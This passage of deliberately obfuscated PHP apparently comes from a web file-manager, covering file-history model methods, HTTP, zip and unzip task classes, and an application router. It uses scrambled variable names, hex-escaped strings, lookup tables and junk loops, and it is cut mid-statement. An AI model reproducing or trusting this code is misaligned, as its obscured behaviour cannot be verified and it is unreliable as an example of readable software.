$ßÜî†õ); $Ÿó˜¹ÍÏ = $this->field($˜É§™ä[2206])->where($ƒÊéºëõ)->order($˜É§™ä[2200])->select(); if (!$Ÿó˜¹ÍÏ || $×š‹ÂîÜ >= count($Ÿó˜¹ÍÏ)) { return; } $»Ç¢“Ä = array_to_keyvalue($Ÿó˜¹ÍÏ, $˜É§™ä[12], $˜É§™ä[450]); $»Ç¢“Ä = array_slice($»Ç¢“Ä, $×š‹ÂîÜ); $Úœ½¢ÛÖ = array_to_keyvalue($Ÿó˜¹ÍÏ, $˜É§™ä[12], $˜É§™ä[516]); $Úœ½¢ÛÖ = array_slice($Úœ½¢ÛÖ, $×š‹ÂîÜ); if (!$»Ç¢“Ä || !$Úœ½¢ÛÖ) { return; } $ƒÊéºëõ = array($˜É§™ä[468] => array($˜É§™ä[7], $»Ç¢“Ä)); $this->where($ƒÊéºëõ)->delete(); Model($˜É§™ä[519])->remove($Úœ½¢ÛÖ); } public function listData($—³Ø×®) { $õÃĞà€ø =& $_SERVER[³à¼î¯á]; $¬ø¼Êà¨ = array($õÃĞà€ø[466] => $—³Ø×®); $˜şÚÇ©â = $õÃĞà€ø[2207]; $ÉúìêÔ» = $this->field($˜şÚÇ©â)->where($¬ø¼Êà¨)->order($õÃĞà€ø[2200])->selectPage(); $this->_listAppendUser($ÉúìêÔ»[$õÃĞà€ø[420]]); $Ç†¡ë–· = Model($õÃĞà€ø[815])->get($õÃĞà€ø[1293]); $’·±»’ = 5; if ($Ç†¡ë–· == $õÃĞà€ø[1294]) { $ÉúìêÔ»[$õÃĞà€ø[420]] = array_slice($ÉúìêÔ»[$õÃĞà€ø[420]], 0, $’·±»’); $ÉúìêÔ»[$õÃĞà€ø[417]] = array($õÃĞà€ø[2208] => 1, $õÃĞà€ø[2209] => 20, $õÃĞà€ø[2210] => 1, $õÃĞà€ø[2211] => count($ÉúìêÔ»[$õÃĞà€ø[420]])); } return $ÉúìêÔ»; } protected function _listAppendUser(&$ˆÅêÚËÌ) { $ù¡õ ˆÍ =& $_SERVER[³à¼î¯á]; $ş“¨à‚Æ = array_to_keyvalue($ˆÅêÚËÌ, $ù¡õ ˆÍ[12], $ù¡õ ˆÍ[1753]); $¢¹¦¤‘° = Model($ù¡õ ˆÍ[574])->userListInfo($ş“¨à‚Æ); foreach ($ˆÅêÚËÌ as &$¨óıÆ€—) { $î°¿€À = $¨óıÆ€—[$ù¡õ ˆÍ[1753]]; $¨óıÆ€—[$ù¡õ ˆÍ[502]] = $¢¹¦¤‘°[$î°¿€À] ? $¢¹¦¤‘°[$î°¿€À] : !1; } unset($¨óıÆ€—); } public function fileInfo($ÖŠ¸îæ) { $©üŞ‹‚È =& $_SERVER[³à¼î¯á]; $±§¶âú = $this->tablePrefix; $ˆŸ¸“± = "{$±§¶âú}\x69\x6f\137\146\151\154\x65\40\x66\x69\x6c\145\x73\x20\x6f\x6e\x20\146\151\x6c\x65\163\56\x66\151\154\145\111\x44\40\x3d\x20\150\151\163\x74\157\162\x79\56\x66\151\x6c\145\111\104"; return $this->alias($©üŞ‹‚È[2212])->where(array($©üŞ‹‚È[468] => $ÖŠ¸îæ))->join($ˆŸ¸“±, $©üŞ‹‚È[2213])->find(); } public function removeItem($ÍÅŸŠ‘ñ) { $È¼Æ¸ =& $_SERVER[³à¼î¯á]; $æ÷äò = array($È¼Æ¸[468] => $ÍÅŸŠ‘ñ); $ìûÜÂÂ¦ = $this->where($æ÷äò)->find(); if ($ìûÜÂÂ¦) { $„ùï€¡Ş = $this->where($æ÷äò)->delete(); Model($È¼Æ¸[519])->remove($ìûÜÂÂ¦[$È¼Æ¸[516]]); return $„ùï€¡Ş; } return !1; } public function removeBySource($¶²¹ğäÛ) { $—„åÙŞö =& $_SERVER[³à¼î¯á]; if (!$¶²¹ğäÛ) { return !1; } if (!is_array($¶²¹ğäÛ)) { $¶²¹ğäÛ = array($¶²¹ğäÛ); } $áÒ¸ğ¾” = array($—„åÙŞö[466] => array($—„åÙŞö[7], $¶²¹ğäÛ)); $÷—®¸ù• = $this->field($—„åÙŞö[517])->where($áÒ¸ğ¾”)->select(); if ($÷—®¸ù•) { $this->where($áÒ¸ğ¾”)->delete(); $ç·¸Ö˜Ñ = array_to_keyvalue($÷—®¸ù•, $—„åÙŞö[12], $—„åÙŞö[516]); Model($—„åÙŞö[519])->remove($ç·¸Ö˜Ñ); } return !0; } public function setDetail($¢ûÑ, $ÏÎÔ†™Æ) { $­Í¢ùíí =& $_SERVER[³à¼î¯á]; return $this->where(array($­Í¢ùíí[468] => $¢ûÑ))->save(array($­Í¢ùíí[2203] => $ÏÎÔ†™Æ)); } public function rollbackToItem($¥Á•¥ş, $™ºãÒÓ) { $Ûûİï²Ä =& $_SERVER[³à¼î¯á]; $Â€‚äëú = Model($Ûûİï²Ä[869])->sourceInfo($¥Á•¥ş); $this->addHistory($Â€‚äëú, LNG($Ûûİï²Ä[2214])); $ş‹ÖÕ³ì = $this->find($™ºãÒÓ); $Â÷‹³Üˆ = array($Ûûİï²Ä[516] => $ş‹ÖÕ³ì[$Ûûİï²Ä[516]], $Ûûİï²Ä[79] => $ş‹ÖÕ³ì[$Ûûİï²Ä[79]], $Ûûİï²Ä[88] => time(), $Ûûİï²Ä[504] => USER_ID); Model($Ûûİï²Ä[869])->where(array($Ûûİï²Ä[184] => $¥Á•¥ş))->save($Â÷‹³Üˆ); return $this->where(array($Ûûİï²Ä[468] => $™ºãÒÓ))->delete(); } public function clearSame($ü§Á÷—) { $‹ñ¯û¯• =& $_SERVER[³à¼î¯á]; $˜Æ£ÕŞ¶ = $this->listData($ü§Á÷—); $µ¢çõ = array_to_keyvalue_group($˜Æ£ÕŞ¶, $‹ñ¯û¯•[516]); $„±âŸ»ì = array(); $Ñê€Õ¢ç = array(); foreach ($µ¢çõ as $ì ›È³÷) { if (!$ì ›È³÷ || count($ì ›È³÷) <= 1) { continue; } foreach ($ì ›È³÷ as $ÍÏ…üå×) { $„±âŸ»ì[] = $ÍÏ…üå×[$‹ñ¯û¯•[516]]; $Ñê€Õ¢ç[] = $ÍÏ…üå×[$‹ñ¯û¯•[450]]; } } if (!$Ñê€Õ¢ç) { return; } $this->where(array($‹ñ¯û¯•[450] => array($‹ñ¯û¯•[7], $Ñê€Õ¢ç)))->delete(); Model($‹ñ¯û¯•[519])->remove($„±âŸ»ì); } public function userSpace() { $Áæ«é‘â =& $_SERVER[³à¼î¯á]; $âì½˜ôÒ = $this->tablePrefix; $®ŒÉÄÄ = array($Áæ«é‘â[1744] => USER_ID); $ğÄ·Ù¼ = "{$âì½˜ôÒ}\151\157\137\x66\151\x6c\145\x20\146\x69\x6c\145\163\40\157\x6e\40\146\151\154\145\x73\x2e\x66\151\x6c\145\111\x44\x20\x3d\x20\x68\151\163\x74\157\x72\171\x2e\146\151\154\145\111\104"; return $this->alias($Áæ«é‘â[2212])->where($®ŒÉÄÄ)->join($ğÄ·Ù¼, $Áæ«é‘â[2213])->sum($Áæ«é‘â[79]); } } goto E†³«Ç­äŠ; bíÊæ•Œİˆ: class TaskHttp extends Task { protected function startAfter() { $ÉÁİ‡¿Ş =& $_SERVER[³à¼î¯á]; $Šµä£ú¦ =& $this->task; $Šµä£ú¦[$ÉÁİ‡¿Ş[1830]] = 1; Hook::bind($ÉÁİ‡¿Ş[1798], array($this, $ÉÁİ‡¿Ş[1831])); Hook::bind($ÉÁİ‡¿Ş[1800], array($this, $ÉÁİ‡¿Ş[1832])); Hook::bind($ÉÁİ‡¿Ş[1802], array($this, $ÉÁİ‡¿Ş[1833])); } protected function endAfter() { $øÚÑÃæí =& $_SERVER[³à¼î¯á]; Hook::unbind($øÚÑÃæí[1798], array($this, $øÚÑÃæí[1831])); Hook::unbind($øÚÑÃæí[1800], array($this, $øÚÑÃæí[1832])); Hook::unbind($øÚÑÃæí[1802], array($this, $øÚÑÃæí[1833])); } public function progressStart($Ñ±À«›ö) { $æ«Û×Ê =& $_SERVER[³à¼î¯á]; $ÜÍÃÚïÆ = curl_getinfo($Ñ±À«›ö); self::log($æ«Û×Ê[1834] . $ÜÍÃÚïÆ[$æ«Û×Ê[358]]); self::valueSet($this->task[$æ«Û×Ê[450]], $this->task); } public function progressEnd($»¾æò) { $é¬µåƒö =& $_SERVER[³à¼î¯á]; self::log($é¬µåƒö[1835] . $this->task[$é¬µåƒö[450]]); $this->end(); } public function progress($î×²¤Ó¯, $ŠƒØ˜Öá, $ÒííÅÅ¦, $êë’ÂÔñ, $ı²ËÉë) { $×£ĞªÍ° =& $_SERVER[³à¼î¯á]; $•Ìù¨î€ =& $this->task; if ($ı²ËÉë > 0) { $•Ìù¨î€[$×£ĞªÍ°[1113]] = $•Ìù¨î€[$×£ĞªÍ°[1113]] == 0 ? $êë’ÂÔñ : $•Ìù¨î€[$×£ĞªÍ°[1113]]; $•Ìù¨î€[$×£ĞªÍ°[1754]] = $ı²ËÉë; } else { if ($ÒííÅÅ¦ > 0) { $•Ìù¨î€[$×£ĞªÍ°[1113]] = $•Ìù¨î€[$×£ĞªÍ°[1113]] == 0 ? $ŠƒØ˜Öá : $•Ìù¨î€[$×£ĞªÍ°[1113]]; $•Ìù¨î€[$×£ĞªÍ°[1754]] = $ÒííÅÅ¦; } } $this->update(); self::log("\160\x72\157\147\x72\145\163\x73\x48\164\x74\x70\x3a\144\157\x77\156\x3a{$ÒííÅÅ¦}\x2f{$ŠƒØ˜Öá}\73\x20\x75\160\154\157\x61\x64\x3a{$ı²ËÉë}\57{$êë’ÂÔñ}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ó é‰ò, $ùÍæèóÔ = '', $–¨È¾ñ¡ = 0, $ç«÷÷ª = '') { $ÍÓÄİŞé =& $_SERVER[³à¼î¯á]; $ç«÷÷ª = $ç«÷÷ª ? $ç«÷÷ª : ($ùÍæèóÔ ? $ùÍæèóÔ : $ó é‰ò); $¡à¹ÂÓ = new Task($ó é‰ò, $ùÍæèóÔ, $–¨È¾ñ¡, $ç«÷÷ª); $GLOBALS[$ÍÓÄİŞé[1836] . $ó é‰ò] = new TaskLog($ÍÓÄİŞé[1737], $¡à¹ÂÓ, $ç«÷÷ª); return $¡à¹ÂÓ; } public function __construct($˜·Ñ£¾ì = '', $öøŠá¨® = '', $Š¨¨×¬ = '') { $³ÍÇ¯ìú =& $_SERVER[³à¼î¯á]; if (!$˜·Ñ£¾ì) { $˜·Ñ£¾ì = $³ÍÇ¯ìú[1737]; } $ÏìÉı“Ç = $˜·Ñ£¾ì . $³ÍÇ¯ìú[437] . rand_string(10); if (!$Š¨¨×¬) { $Š¨¨×¬ = $˜·Ñ£¾ì . $³ÍÇ¯ìú[53] . $Š¨¨×¬; } switch ($˜·Ñ£¾ì) { case $³ÍÇ¯ìú[1737]: if (!$öøŠá¨® || !$öøŠá¨®->task) { return echoLog($˜·Ñ£¾ì . $³ÍÇ¯ìú[1837]); } $¡ˆÂ»ˆñ = $öøŠá¨®; $ÏìÉı“Ç = $¡ˆÂ»ˆñ->task[$³ÍÇ¯ìú[450]]; $˜·Ñ£¾ì = $¡ˆÂ»ˆñ->task[$³ÍÇ¯ìú[450]]; if (!$¡ˆÂ»ˆñ->task[$³ÍÇ¯ìú[1643]]) { $¡ˆÂ»ˆñ->task[$³ÍÇ¯ìú[1643]] = $Š¨¨×¬ ? $Š¨¨×¬ : $˜·Ñ£¾ì; } break; case $³ÍÇ¯ìú[1838]: if (!$öøŠá¨®) { return echoLog($˜·Ñ£¾ì . $³ÍÇ¯ìú[1839]); } $¯ğŠıòÁ = is_string($öøŠá¨®) ? array($öøŠá¨®) : $öøŠá¨®; $¡ˆÂ»ˆñ = new TaskFileTransfer($ÏìÉı“Ç, $˜·Ñ£¾ì, 0, $Š¨¨×¬ ? $Š¨¨×¬ : $¯ğŠıòÁ[0]); foreach ($¯ğŠıòÁ as $¥ÒÙ Ã•) { $¡ˆÂ»ˆñ->addPath($¥ÒÙ Ã•); } break; case $³ÍÇ¯ìú[364]: if (!$öøŠá¨®) { return echoLog($˜·Ñ£¾ì . $³ÍÇ¯ìú[1839]); } $¯ğŠıòÁ = is_string($öøŠá¨®) ? array($öøŠá¨®) : $öøŠá¨®; $¡ˆÂ»ˆñ = new TaskZip($ÏìÉı“Ç, $˜·Ñ£¾ì, 0, $Š¨¨×¬ ? $Š¨¨×¬ : $¯ğŠıòÁ[0]); foreach ($¯ğŠıòÁ as $¥ÒÙ Ã•) { $¡ˆÂ»ˆñ->addPath($¥ÒÙ Ã•); } break; case $³ÍÇ¯ìú[1268]: if (!$öøŠá¨®) { return echoLog($˜·Ñ£¾ì . $³ÍÇ¯ìú[1839]); } $¡ˆÂ»ˆñ = new TaskUnZip($ÏìÉı“Ç, $˜·Ñ£¾ì, 0, $Š¨¨×¬ ? $Š¨¨×¬ : $öøŠá¨®); if ($öøŠá¨®) { $¡ˆÂ»ˆñ->addFile($öøŠá¨®); } break; case $³ÍÇ¯ìú[152]: $¡ˆÂ»ˆñ = new TaskHttp($ÏìÉı“Ç, $˜·Ñ£¾ì); break; default: return; break; } $this->task = $¡ˆÂ»ˆñ; $this->taskID = $ÏìÉı“Ç; Hook::bind($³ÍÇ¯ìú[1774], array($this, $³ÍÇ¯ìú[1840])); Hook::bind($³ÍÇ¯ìú[1776], array($this, $³ÍÇ¯ìú[1841])); Hook::bind($³ÍÇ¯ìú[1770], array($this, $³ÍÇ¯ìú[1842])); echoLog($³ÍÇ¯ìú[1843] . $¡ˆÂ»ˆñ->task[$³ÍÇ¯ìú[1643]]); } public function __destruct() { $this->end(); } public function end($‹³èœ˜ = '') { $­İü¶—Ì =& $_SERVER[³à¼î¯á]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($‹³èœ˜); $this->task = !1; $this->taskID = !1; Hook::unbind($­İü¶—Ì[1774], array($this, $­İü¶—Ì[1840])); Hook::unbind($­İü¶—Ì[1776], array($this, $­İü¶—Ì[1841])); Hook::unbind($­İü¶—Ì[1770], array($this, $­İü¶—Ì[1842])); } public function taskUpdate($£øšª…Ü) { $š¸ê¼¾Ã =& $_SERVER[³à¼î¯á]; if (!$£øšª…Ü || $this->taskID != $£øšª…Ü[$š¸ê¼¾Ã[450]]) { return; } $¥ç…Êß™ = 20; $÷‰”Ëºƒ = intval($£øšª…Ü[$š¸ê¼¾Ã[1755]] * $¥ç…Êß™); $±¤§««ß = $š¸ê¼¾Ã[166] . str_repeat($š¸ê¼¾Ã[932], $÷‰”Ëºƒ) . $š¸ê¼¾Ã[1064] . str_repeat($š¸ê¼¾Ã[53], $¥ç…Êß™ - $÷‰”Ëºƒ) . $š¸ê¼¾Ã[168]; $ñ…¼ÜÈÇ = $±¤§««ß . sprintf($š¸ê¼¾Ã[1844], $£øšª…Ü[$š¸ê¼¾Ã[1755]] * 100) . $š¸ê¼¾Ã[1845]; $ıÖ™ìÙµ = $ñ…¼ÜÈÇ . $£øšª…Ü[$š¸ê¼¾Ã[1754]] . $š¸ê¼¾Ã[8] . $£øšª…Ü[$š¸ê¼¾Ã[1113]] . LNG($š¸ê¼¾Ã[1846]); $÷Š»³ìŞ = $š¸ê¼¾Ã[12]; if ($£øšª…Ü[$š¸ê¼¾Ã[1830]]) { $ıÖ™ìÙµ = $ñ…¼ÜÈÇ . size_format($£øšª…Ü[$š¸ê¼¾Ã[1754]]) . $š¸ê¼¾Ã[8] . size_format($£øšª…Ü[$š¸ê¼¾Ã[1113]]); $÷Š»³ìŞ = size_format($£øšª…Ü[$š¸ê¼¾Ã[1756]]) . $š¸ê¼¾Ã[1847]; } if ($£øšª…Ü[$š¸ê¼¾Ã[1115]]) { $£øšª…Ü[$š¸ê¼¾Ã[1804]] = $£øšª…Ü[$š¸ê¼¾Ã[1115]] . $š¸ê¼¾Ã[53] . $£øšª…Ü[$š¸ê¼¾Ã[1804]]; } if ($£øšª…Ü[$š¸ê¼¾Ã[1804]]) { $§°Îº£ = $š¸ê¼¾Ã[12]; if ($£øšª…Ü[$š¸ê¼¾Ã[1806]]) { $§°Îº£ = $š¸ê¼¾Ã[50] . size_format($£øšª…Ü[$š¸ê¼¾Ã[1807]]) . $š¸ê¼¾Ã[8] . size_format($£øšª…Ü[$š¸ê¼¾Ã[1806]]); } $÷Š»³ìŞ .= $£øšª…Ü[$š¸ê¼¾Ã[1804]] . $§°Îº£; } if ($£øšª…Ü[$š¸ê¼¾Ã[808]] && !$£øšª…Ü[$š¸ê¼¾Ã[1806]]) { $÷Š»³ìŞ .= $š¸ê¼¾Ã[53] . size_format($£øšª…Ü[$š¸ê¼¾Ã[1811]]) . $š¸ê¼¾Ã[8] . size_format($£øšª…Ü[$š¸ê¼¾Ã[808]]); } echoLog($ıÖ™ìÙµ . $š¸ê¼¾Ã[53] . $÷Š»³ìŞ, !0); } public function taskEnd($‘äéÂÙê) { $×—Î°êÚ =& $_SERVER[³à¼î¯á]; if (!$‘äéÂÙê || $this->taskID != $‘äéÂÙê[$×—Î°êÚ[450]]) { return; } $¶ÇÓ¿¶Ç = $‘äéÂÙê ? $‘äéÂÙê[$×—Î°êÚ[1754]] . $×—Î°êÚ[8] . $‘äéÂÙê[$×—Î°êÚ[1113]] . LNG($×—Î°êÚ[1846]) . $×—Î°êÚ[74] : $×—Î°êÚ[12]; echoLog($×—Î°êÚ[1848] . $‘äéÂÙê[$×—Î°êÚ[1643]] . ($‘äéÂÙê[$×—Î°êÚ[501]] ? $×—Î°êÚ[74] . $‘äéÂÙê[$×—Î°êÚ[501]] : $×—Î°êÚ[12]) . $×—Î°êÚ[74] . $¶ÇÓ¿¶Ç . $×—Î°êÚ[1849] . sprintf($×—Î°êÚ[895], timeFloat() - $‘äéÂÙê[$×—Î°êÚ[1757]]) . $×—Î°êÚ[1769]); $this->end(); } public function taskKill($úúÜƒş¶) { $íõ™ß¯Ø =& $_SERVER[³à¼î¯á]; if (!$úúÜƒş¶ || $this->taskID != $úúÜƒş¶[$íõ™ß¯Ø[450]]) { return; } echoLog($íõ™ß¯Ø[1850] . $úúÜƒş¶[$íõ™ß¯Ø[1643]]); } } $_file = $_SERVER[$_SERVER[³à¼î¯á][922]]; goto Bì©½Å¥; cĞï…ˆºê: class Application { private $defaultModule = "\151\x6e\144\145\x78"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\151\x6e\x64\145\x78"; function __construct() { } public function setDefault($üÒ—¯ªœ) { $ŸŒŒíËĞ =& $_SERVER[³à¼î¯á]; $‡Ü‘¡Îğ =& $_SERVER[í¡èúÆ]; $æï¨áÚ’ = explode($‡Ü‘¡Îğ[0], trim($üÒ—¯ªœ, $‡Ü‘¡Îğ[0])); $this->defaultModule = $æï¨áÚ’[0] ? $æï¨áÚ’[0] : $this->defaultModule; $‘ªÎê² = $ŸŒŒíËĞ[659]; while ($‘ªÎê² < $ŸŒŒíËĞ[660]) { if ($‘ªÎê² >= 0) { break; } $‘ªÎê²++; } $this->defaultController = $æï¨áÚ’[1] ? $æï¨áÚ’[1] : $this->defaultController; $this->defaultAction = $æï¨áÚ’[2] ? $æï¨áÚ’[2] : $this->defaultAction; $Ñü£èû´ = $ŸŒŒíËĞ[661]; while (strlen($Ñü£èû´) < $ŸŒŒíËĞ[660]) { if (!$Ñü£èû´) { break; } $Ñü£èû´++; } $this->azkw333b6a40($‡Ü‘¡Îğ[1], array($this, $‡Ü‘¡Îğ[2])); } public function appRun($êŸÂØü­) { $©ª‡™±¤ =& $_SERVER[³à¼î¯á]; $Ã‰†üº“ =& $_SERVER[í¡èúÆ]; $½„ƒÀÜË = explode($Ã‰†üº“[0], $êŸÂØü­); $¬…³­˜‡ = $©ª‡™±¤[662]; if (strlen($¬…³­˜‡) < $©ª‡™±¤[663]) { return; } $¡ÊÊ²ı = strtolower($½„ƒÀÜË[0]); $©Ú–ùœ = $©ª‡™±¤[664]; if (strlen($©Ú–ùœ) < $©ª‡™±¤[665]) { return; } $®‚”š¨š = $Ã‰†üº“[3]; if ($¡ÊÊ²ı == $Ã‰†üº“[4]) { $®‚”š¨š = $Ã‰†üº“[5]; $½„ƒÀÜË[0] = $Ã‰†üº“[6]; $½„ƒÀÜË[1] = $½„ƒÀÜË[1] . $Ã‰†üº“[7]; $êŸÂØü­ = join($Ã‰†üº“[0], $½„ƒÀÜË); $êŸÂØü­ = trim($êŸÂØü­, $Ã‰†üº“[0]); } call_user_func(array($Ã‰†üº“[8], $Ã‰†üº“[9]), $®‚”š¨š . $Ã‰†üº“[10], $êŸÂØü­); ActionCall($êŸÂØü­); $é™ËŠªù = $©ª‡™±¤[666]; if (strlen($é™ËŠªù) < $©ª‡™±¤[658]) { return; } call_user_func(array($Ã‰†üº“[8], $Ã‰†üº“[9]), $®‚”š¨š . $Ã‰†üº“[11], $êŸÂØü­); $íâó¢ß¨ = $©ª‡™±¤[667]; while (strlen($íâó¢ß¨) < $©ª‡™±¤[668]) { if (!$íâó¢ß¨) { break; } $íâó¢ß¨++; } } private function autorun() { $‹ó³…ïí =& $_SERVER[³à¼î¯á]; $€‡’“«İ =& $_SERVER[í¡èúÆ]; global $config; $û‘Û½½› = $‹ó³…ïí[669]; while ($û‘Û½½› < $‹ó³…ïí[658]) { if ($û‘Û½½› >= 0) { break; } $û‘Û½½›++; } if (count($config[$€‡’“«İ[12]]) == 0) { return; } foreach ($config[$€‡’“«İ[12]] as $£Ã–¥ü => $Õò›ó´ë) { $this->appRun($Õò›ó´ë); $“ÓÖ¿½× = $‹ó³…ïí[670]; while (strlen($“ÓÖ¿½×) < $‹ó³…ïí[658]) { if (!$“ÓÖ¿½×) { break; } $“ÓÖ¿½×++; } } } private function lzjwee88f9eb() { $‰üÙÙÒ¹ =& $_SERVER[³à¼î¯á]; $ş•¦×ƒı =& $_SERVER[í¡èúÆ]; $‰µÊ½Û¸ = $ş•¦×ƒı[4]; $Ù†«†²û = $GLOBALS[$ş•¦×ƒı[13]][$ş•¦×ƒı[14]][0]; $½Õ¿ Ñ = $‰üÙÙÒ¹[671]; while (strlen($½Õ¿ Ñ) < $‰üÙÙÒ¹[658]) { if (!$½Õ¿ Ñ) { break; } $½Õ¿ Ñ++; } if (!$Ù†«†²û || strlen($Ù†«†²û) <= strlen($‰µÊ½Û¸)) { return; } if (strtolower(substr($Ù†«†²û, -strlen($‰µÊ½Û¸))) != $‰µÊ½Û¸) { return; } $æçé›é³ = substr($Ù†«†²û, 0, -strlen($‰µÊ½Û¸)); $›ëÜóÆ€ = array($ş•¦×ƒı[4], $æçé›é³); $˜‰Æ«Ì¶ = $‰üÙÙÒ¹[672]; if (strlen($˜‰Æ«Ì¶) < $‰üÙÙÒ¹[663]) { return; } $öãıßÂ½ = array_slice($GLOBALS[$ş•¦×ƒı[13]][$ş•¦×ƒı[14]], 1); $GLOBALS[$ş•¦×ƒı[13]][$ş•¦×ƒı[14]] = array_merge($›ëÜóÆ€, $öãıßÂ½); $GLOBALS[$ş•¦×ƒı[13]][$ş•¦×ƒı[15]] = implode($ş•¦×ƒı[0], $GLOBALS[$ş•¦×ƒı[13]][$ş•¦×ƒı[14]]); $½Êí†—– = $‰üÙÙÒ¹[673]; if (strlen($½Êí†—–) < $‰üÙÙÒ¹[663]) { die; } } private function hsulbc35af0a() { $Ñã€ÅÀì =& $_SERVER[í¡èúÆ]; if ($GLOBALS[$Ñã€ÅÀì[13]][$Ñã€ÅÀì[15]] != $Ñã€ÅÀì[6]) { return; } $Ô™‚åŞÒ = $_SERVER[$Ñã€ÅÀì[16]]; $å²î€Õè = $Ñã€ÅÀì[17]; if (!strstr($Ô™‚åŞÒ, $å²î€Õè)) { return; } $Ï°¯ú— = strrpos($Ô™‚åŞÒ, $å²î€Õè); $”ªŒ…‰ = substr($Ô™‚åŞÒ, $Ï°¯ú— + strlen($å²î€Õè)); preg_match_all($Ñã€ÅÀì[18], $”ªŒ…‰, $Åë¬¢–); $Ö‰ÃØâÆ = $_SERVER[³à¼î¯á][674]; $”ªŒ…‰ = trim($Åë¬¢–[0][0], $Ñã€ÅÀì[19]); $GLOBALS[$Ñã€ÅÀì[13]][$Ñã€ÅÀì[14]] = explode($Ñã€ÅÀì[19], $”ªŒ…‰); $GLOBALS[$Ñã€ÅÀì[13]][$Ñã€ÅÀì[15]] = implode($Ñã€ÅÀì[0], $GLOBALS[$Ñã€ÅÀì[13]][$Ñã€ÅÀì[14]]); } public function run() { $¹±”ö­· =& $_SERVER[³à¼î¯á]; $úçîÒ¤ç =& $_SERVER[í¡èúÆ]; $this->hsulbc35af0a(); $¢É¥Õ‘§ = $¹±”ö­·[675]; if (!$¢É¥Õ‘§) { die; } $this->lzjwee88f9eb(); $ùÔÍÃ€™ = $¹±”ö­·[676]; $¾…§âå = $GLOBALS[$úçîÒ¤ç[13]][$úçîÒ¤ç[14]]; $£õ¥Šå = $¹±”ö­·[677]; while ($£õ¥Šå < $¹±”ö­·[668]) { if ($£õ¥Šå >= 0) { break; } $£õ¥Šå++; } $ÄÄÈÀÛ = $GLOBALS[$úçîÒ¤ç[13]][$úçîÒ¤ç[15]]; define($úçîÒ¤ç[20], isset($¾…§âå[0]) && $¾…§âå[0] ? $¾…§âå[0] : $this->defaultModule); define($úçîÒ¤ç[21], isset($¾…§âå[1]) && $¾…§âå[0] ? $¾…§âå[1] : $this->defaultController); $¼©ßåÚå = $¹±”ö­·[678]; while ($¼©ßåÚå < $¹±”ö­·[663]) { if ($¼©ßåÚå >= 0) { break; } $¼©ßåÚå++; } define($úçîÒ¤ç[22], isset($¾…§âå[2]) && $¾…§âå[0] ? $¾…§âå[2] : $this->defaultAction); define($úçîÒ¤ç[23], MOD . $úçîÒ¤ç[0] . ST . $úçîÒ¤ç[0] . ACT); $§ ê²¤‹ = $¹±”ö­·[679]; if (!$§ ê²¤‹) { return; } $_SERVER[$úçîÒ¤ç[24]] = strtolower(ACTION); $±’®•Üø = $¹±”ö­·[680]; if (strlen($±’®•Üø) < $¹±”ö­·[668]) { return; } $this->autorun(); if (count($¾…§âå) >= 3) { $this->appRun($ÄÄÈÀÛ); } else { $this->appRun(ACTION); } } private $yplsb3e292fc = array(); private $gyvs0a2c64ec = ''; public function pxhu1aa7c4bd() { $‹øÅ¯‘ò =& $_SERVER[³à¼î¯á]; $ºˆø‡şÃ =& $_SERVER[í¡èúÆ]; $this->fjil634d23fd(); $ß›­ƒ° = $‹øÅ¯‘ò[681]; $this->axth503953e0(); $Ş ëİ×´ = $‹øÅ¯‘ò[682]; $this->xrnge323bcee(); $this->gvndc7b52d04(); $this->ylmn95b7f216(); $²Èæ—İØ = $‹øÅ¯‘ò[683]; $this->mvqlb8c6d0d4(); $this->uvbw1fb22a5f(); $this->azkw333b6a40($ºˆø‡şÃ[25], array($this, $ºˆø‡şÃ[26])); $¹­¶ÖƒŸ = $‹øÅ¯‘ò[684]; if (strlen($¹­¶ÖƒŸ) < $‹øÅ¯‘ò[665]) { return; } $this->azkw333b6a40($ºˆø‡şÃ[27], array($this, $ºˆø‡şÃ[28])); $è¼¢Õî¾ = $‹øÅ¯‘ò[685]; if (!$è¼¢Õî¾) { die; } $this->azkw333b6a40($ºˆø‡şÃ[29], array($this, $ºˆø‡şÃ[30])); $¼ò£†˜ = $‹øÅ¯‘ò[686]; if (strlen($¼ò£†˜) < $‹øÅ¯‘ò[663]) { return; } $this->azkw333b6a40($ºˆø‡şÃ[31], array($this, $ºˆø‡şÃ[32])); } public function ymsl382d6ea6($¾»ÜÓ) { $Õ¡÷™³Ã =& $_SERVER[³à¼î¯á]; $²ãÎõãÙ =& $_SERVER[í¡èúÆ]; $šôÜƒ¡î = Model($²ãÎõãÙ[33])->get(); $àÄ¢ßåÃ = array($²ãÎõãÙ[34], $²ãÎõãÙ[35], $²ãÎõãÙ[36], $²ãÎõãÙ[37], $²ãÎõãÙ[38], $²ãÎõãÙ[39], $²ãÎõãÙ[40], $²ãÎõãÙ[41], $²ãÎõãÙ[42], $²ãÎõãÙ[43], $²ãÎõãÙ[44], $²ãÎõãÙ[45], $²ãÎõãÙ[46], $²ãÎõãÙ[47], $²ãÎõãÙ[48], $²ãÎõãÙ[49], $²ãÎõãÙ[50], $²ãÎõãÙ[51], $²ãÎõãÙ[52], $²ãÎõãÙ[53], $²ãÎõãÙ[54], $²ãÎõãÙ[55], $²ãÎõãÙ[56], $²ãÎõãÙ[57], $²ãÎõãÙ[58], $²ãÎõãÙ[59], $²ãÎõãÙ[60], $²ãÎõãÙ[61], $²ãÎõãÙ[62], $²ãÎõãÙ[63], $²ãÎõãÙ[64], $²ãÎõãÙ[65], $²ãÎõãÙ[66], $²ãÎõãÙ[67], $²ãÎõãÙ[68], $²ãÎõãÙ[69], $²ãÎõãÙ[70], $²ãÎõãÙ[71], $²ãÎõãÙ[72], $²ãÎõãÙ[73], $²ãÎõãÙ[74], $²ãÎõãÙ[75], $²ãÎõãÙ[76], $²ãÎõãÙ[77], $²ãÎõãÙ[78], $²ãÎõãÙ[79], $²ãÎõãÙ[80], $²ãÎõãÙ[81], $²ãÎõãÙ[82], $²ãÎõãÙ[83], $²ãÎõãÙ[84]); $ü¨¼˜º‰ = $Õ¡÷™³Ã[687]; foreach ($àÄ¢ßåÃ as $Ôù×¥µÑ) { $çúïĞÕ = $GLOBALS[$²ãÎõãÙ[85]][$²ãÎõãÙ[86]][$Ôù×¥µÑ]; if (isset($šôÜƒ¡î[$Ôù×¥µÑ])) { $çúïĞÕ = $šôÜƒ¡î[$Ôù×¥µÑ]; } $¾»ÜÓ[$²ãÎõãÙ[87]][$²ãÎõãÙ[88]][$Ôù×¥µÑ] = $çúïĞÕ; } $¬µ®´ª = 